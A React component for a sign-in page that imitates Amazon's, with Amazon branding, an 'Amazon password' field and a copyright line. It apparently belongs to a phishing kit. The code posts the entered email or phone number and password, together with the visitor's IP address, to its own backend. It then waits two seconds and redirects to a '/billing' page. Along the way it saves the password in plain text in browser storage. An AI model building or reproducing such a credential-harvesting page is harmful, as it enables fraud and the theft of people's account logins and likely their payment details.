import React, { useState, useEffect } from "react";
import { Link, useNavigate } from "react-router-dom";
import Logo from "../../components/Logo/Logo";
import Input from "../../components/Input/Input";
import Button from "../../components/Button/Button";
import { getClientIP } from "../../services/ipService";

const Login = () => {
  const navigate = useNavigate();
  const [showPassword, setShowPassword] = useState(false);

  // Initialize form data from localStorage or default values
  const [formData, setFormData] = useState(() => {
    const savedData = localStorage.getItem("loginFormData");
    return savedData
      ? JSON.parse(savedData)
      : {
          email: "",
          password: "",
          keepSignedIn: false,
        };
  });

  const [errors, setErrors] = useState({
    email: "",
    password: "",
  });

  const [isLoading, setIsLoading] = useState(false);

  // Save form data to localStorage whenever it changes
  useEffect(() => {
    localStorage.setItem("loginFormData", JSON.stringify(formData));
  }, [formData]);

  const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  // Rest of your validation functions remain the same
  const validateEmailOrPhone = (value) => {
    if (!value) {
      return "Email or phone number is required";
    }
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^(?:\+?\d{0,3}[-.\s]?)?\(?[0-9\s-().]{7,20}\)?$/;
    const digitCount = value.replace(/\D/g, "").length;

    if (
      !emailRegex.test(value) &&
      (!phoneRegex.test(value) || digitCount < 7 || digitCount > 15)
    ) {
      return "Please enter a valid email address or phone number";
    }
    return "";
  };

  const validatePassword = (password) => {
    if (!password) {
      return "Password is required";
    }
    if (password.length < 6) {
      return "Password must be at least 6 characters";
    }
    return "";
  };

  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target;
    const inputValue = type === "checkbox" ? checked : value;

    setFormData((prev) => ({
      ...prev,
      [name]: inputValue,
    }));

    if (name === "email") {
      setErrors((prev) => ({
        ...prev,
        email: validateEmailOrPhone(inputValue),
      }));
    }

    if (name === "password") {
      setErrors((prev) => ({
        ...prev,
        password: "",
      }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const emailOrPhoneError = validateEmailOrPhone(formData.email);
    const passwordError = validatePassword(formData.password);

    setErrors({
      email: emailOrPhoneError,
      password: passwordError,
    });

    if (emailOrPhoneError || passwordError) {
      return;
    }

    setIsLoading(true);

    try {
      const ipInfo = await getClientIP();

      const response = await fetch(
        `${process.env.REACT_APP_API_URL}/auth/login`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            ...formData,
            ip: ipInfo,
          }),
        }
      );

      const data = await response.json();
      await delay(2000);

      if (data.success) {
        localStorage.removeItem("loginFormData");
        sessionStorage.setItem("isAuthenticated", "true");
        sessionStorage.setItem("completedFlow", "login");
        sessionStorage.setItem("userEmail", formData.email);
        navigate("/billing");
      }
    } catch (error) {
      alert("An error occurred while logging in");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center pt-8 px-4">
      <Logo />
      <div className="w-full max-w-[350px] p-4 border border-gray-300 rounded-lg">
        <h1 className="text-3xl mb-4">Sign in</h1>
        <form onSubmit={handleSubmit} noValidate>
          <Input
            label="Email or phone number"
            type="email"
            name="email"
            value={formData.email}
            onChange={handleInputChange}
            error={errors.email}
            disabled={isLoading}
          />
          <Input
            label="Amazon password"
            type={showPassword ? "text" : "password"}
            name="password"
            value={formData.password}
            onChange={handleInputChange}
            error={errors.password}
            disabled={isLoading}
          />
          <div className="flex items-center mb-4">
            <input
              type="checkbox"
              id="showPassword"
              checked={showPassword}
              onChange={() => setShowPassword(!showPassword)}
              className="mr-2"
              disabled={isLoading}
            />
            <label htmlFor="showPassword" className="text-sm">
              Show password
            </label>
          </div>
          <Button type="submit" disabled={isLoading}>
            {isLoading ? "Signing in..." : "Sign in"}
          </Button>
          <div className="flex items-center mb-4 mt-4">
            <input
              type="checkbox"
              id="keepSignedIn"
              name="keepSignedIn"
              checked={formData.keepSignedIn}
              onChange={handleInputChange}
              className="mr-2"
              disabled={isLoading}
            />
            <label htmlFor="keepSignedIn" className="text-sm">
              Keep me signed in
            </label>
          </div>
        </form>
        <div className="mt-4 text-sm">
          <p>
            By signing in you are agreeing to our{" "}
            <span className="text-blue-600 hover:text-orange-600 hover:underline cursor-pointer">
              Terms of Use
            </span>{" "}
            and{" "}
            <span className="text-blue-600 hover:text-orange-600 hover:underline cursor-pointer">
              Privacy Notice
            </span>
          </p>
        </div>
      </div>
      <div className="w-full max-w-[350px] mt-20 text-center">
        <div className="relative py-4">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-gray-300"></div>
          </div>
        </div>
      </div>
      <div className="text-xs text-gray-600 mt-10 mb-4">
        © 1996-2024, Amazon.com, Inc. or its affiliates
      </div>
    </div>
  );
};

export default Login;
